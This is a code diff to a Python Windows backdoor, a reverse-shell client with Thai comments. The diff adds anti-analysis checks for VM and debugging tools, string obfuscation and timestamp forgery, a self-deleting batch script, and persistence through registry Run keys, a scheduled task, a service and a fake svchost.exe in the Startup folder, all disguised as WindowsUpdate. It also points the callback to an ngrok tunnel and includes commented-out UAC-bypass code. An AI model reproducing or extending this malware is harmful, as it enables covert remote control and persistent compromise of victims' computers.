@@ -16,17 +16,20 @@ import winreg
 import win32gui
 import win32con
 import win32process
+import random
+import shutil
 
 
 class BD:
     def __init__(self, ip, port):
         
-        self.upgrade_pip()
-        self.install_dependencies()
+        # self.upgrade_pip()
+        # self.install_dependencies()
         self.ip = ip 
         self.port = port
         self.reconnect()
         self.hide_self()
+        self.evade_antivirus()
         # self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # self.connection.connect((ip, port))
 
@@ -405,20 +408,181 @@ class BD:
     #     except Exception as e:
     #         return f"[-] Execution failed: {str(e)}"
 
-    def silent_uac_bypass_run(self, program_path):
+    # def silent_uac_bypass_run(self, program_path):
+    #     try:
+    #         key_path = "Software\\Classes\\ms-settings\\Shell\\Open\\command"
+    #         command_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+    #         winreg.SetValueEx(command_key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            
+    #         # เพิ่มคำสั่ง PowerShell เพื่อรันโปรแกรมด้วยสิทธิ์ admin
+    #         powershell_cmd = f'powershell.exe Start-Process "{program_path}" -Verb RunAs -WindowStyle Hidden'
+    #         winreg.SetValueEx(command_key, "", 0, winreg.REG_SZ, powershell_cmd)
+    #         winreg.CloseKey(command_key)
+
+    #         subprocess.run("fodhelper.exe") 
+    #         time.sleep(2)
+
+    #         winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+    #         return "[+] Program executed without UAC"
+    #     except Exception as e:
+    #         return f"[-] Execution failed: {str(e)}"
+
+
+    def evade_antivirus(self):
+        """หลบ Antivirus โดยการปลอม Process"""
         try:
-            key_path = "Software\\Classes\\mscfile\\shell\\open\\command"
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program_path)
-            winreg.CloseKey(key)
+            vm_processes = ['vmsrvc.exe', 'vmusrvc.exe', 'vboxtray.exe', 'vmtoolsd.exe']
+            analysis_tools = ['wireshark.exe', 'processhacker.exe', 'procmon.exe', 'procexp.exe']
             
-            subprocess.Popen("eventvwr.msc")
-            time.sleep(2)
+            running_processes = [p.name().lower() for p in psutil.process_iter()]
             
-            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
-            return "[+] Program executed without UAC"
+            for proc in vm_processes + analysis_tools:
+                if proc.lower() in running_processes:
+                    return False  
+                
+            time.sleep(random.uniform(1, 3))
+            
+            encoded_strings = {}
+            for s in ['cmd.exe', 'powershell.exe', 'reg.exe']:
+                key = random.randint(1, 255)
+                encoded = bytes([ord(c) ^ key for c in s])
+                encoded_strings[s] = (encoded, key)
+
+            # ปรับเปลี่ยน file timestamp
+            current_file = sys.argv[0]
+            old_time = time.time() - (90 * 24 * 60 * 60)  # ย้อนหลังไปประมาณ 90 วัน
+            os.utime(current_file, (old_time, old_time))
+
+            # สร้าง fake errors บางครั้ง
+            if random.random() < 0.1:  # 10% chance
+                print("Error loading DLL: 0x80004005")
+
         except Exception as e:
-            return f"[-] Execution failed: {str(e)}"
+            return f"[-] Evasion error: {str(e)}"
+
+    def self_destruct(self):
+        try:
+            self.remove_persistence()
+            temp_dir = os.environ.get('TEMP')
+            batch_path = os.path.join(temp_dir, "cleanup.bat")
+            
+            batch = f'''@echo off
+            timeout 3 > NUL
+            del "{sys.executable}"
+            del "%~f0"'''
+            
+            with open(batch_path, "w") as f:
+                f.write(batch)
+            
+            subprocess.Popen(batch_path, shell=True)
+            sys.exit()
+        except Exception as e:
+            return f"[-] Self-destruct failed: {str(e)}"
+
+    def add_persistence(self, method="all"):
+        """รันโปรแกรมอัตโนมัติเมื่อเปิดเครื่อง"""
+        try:
+            success_methods = []
+            executable_path = sys.executable
+
+            if method in ["registry", "all"]:
+                try:
+                    # เพิ่มใน Registry Run
+                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
+                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+                    winreg.SetValueEx(key, "WindowsUpdate", 0, 
+                        winreg.REG_SZ, executable_path)
+                    winreg.CloseKey(key)
+                    success_methods.append("registry")
+                except:
+                    pass
+
+                try:
+                    # เพิ่มใน Registry RunOnce
+                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
+                        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
+                    winreg.SetValueEx(key, "WindowsUpdate", 0, 
+                        winreg.REG_SZ, executable_path)
+                    winreg.CloseKey(key)
+                    success_methods.append("registry_once")
+                except:
+                    pass
+
+            if method in ["task", "all"]:
+                try:
+                    # สร้าง Scheduled Task
+                    task_name = "WindowsUpdateTask"
+                    cmd = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc onlogon /rl highest /f'
+                    subprocess.run(cmd, shell=True)
+                    success_methods.append("task")
+                except:
+                    pass
+
+            if method in ["service", "all"]:
+                try:
+                    # สร้าง Windows Service
+                    service_name = "WindowsUpdate"
+                    cmd = f'sc create "{service_name}" binpath= "{executable_path}" start= auto'
+                    subprocess.run(cmd, shell=True)
+                    subprocess.run(f'sc start "{service_name}"', shell=True)
+                    success_methods.append("service")
+                except:
+                    pass
+
+            if method in ["startup", "all"]:
+                try:
+                    # เพิ่มใน Startup folder
+                    startup_folder = os.path.join(os.getenv('APPDATA'), 
+                        'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+                    startup_file = os.path.join(startup_folder, "svchost.exe")
+                    shutil.copy2(executable_path, startup_file)
+                    success_methods.append("startup")
+                except:
+                    pass
+
+            return f"[+] Persistence added using: {', '.join(success_methods)}"
+        except Exception as e:
+            return f"[-] Persistence error: {str(e)}"
+
+
+    def remove_persistence(self):
+        """ลบการรันอัตโนมัติทั้งหมด"""
+        try:
+            # ลบจาก Registry
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                    0, winreg.KEY_ALL_ACCESS)
+                winreg.DeleteValue(key, "WindowsUpdate")
+                winreg.CloseKey(key)
+            except:
+                pass
+
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 
+                    0, winreg.KEY_ALL_ACCESS)
+                winreg.DeleteValue(key, "WindowsUpdate")
+                winreg.CloseKey(key)
+            except:
+                pass
+
+            # ลบ Scheduled Task
+            subprocess.run('schtasks /delete /tn "WindowsUpdateTask" /f', shell=True)
+
+            # ลบ Service
+            subprocess.run('sc stop "WindowsUpdate"', shell=True)
+            subprocess.run('sc delete "WindowsUpdate"', shell=True)
+
+            # ลบจาก Startup folder
+            startup_file = os.path.join(os.getenv('APPDATA'), 
+                'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe')
+            if os.path.exists(startup_file):
+                os.remove(startup_file)
+
+            return "[+] All persistence methods removed"
+        except Exception as e:
+            return f"[-] Remove persistence error: {str(e)}"
 
     def run_cmd(self):
         while True:
@@ -442,6 +606,12 @@ class BD:
 
                 elif cmd[0] == "download" and len(cmd) > 1:
                     cmd_result = self.download_file(cmd[1])
+
+                elif cmd[0] == "selfdelete":  
+                    cmd_result = self.self_destruct()
+
+                elif cmd[0] == "persist":
+                    cmd_result = self.add_persistence()
                 
                 elif cmd[0] == "shutdown":
                     cmd_result = self.system_shutdown()
@@ -470,7 +640,8 @@ if __name__ == "__main__":
     try:
         while True:
             try:
-                server_bd = BD("192.168.1.101", 5555)
+                server_bd = BD("0.tcp.ap.ngrok.io", 17092)
+                # server_bd = BD("192")
                 server_bd.run_cmd()
             except Exception as e:
                 print(f"[-] Error: {str(e)}")
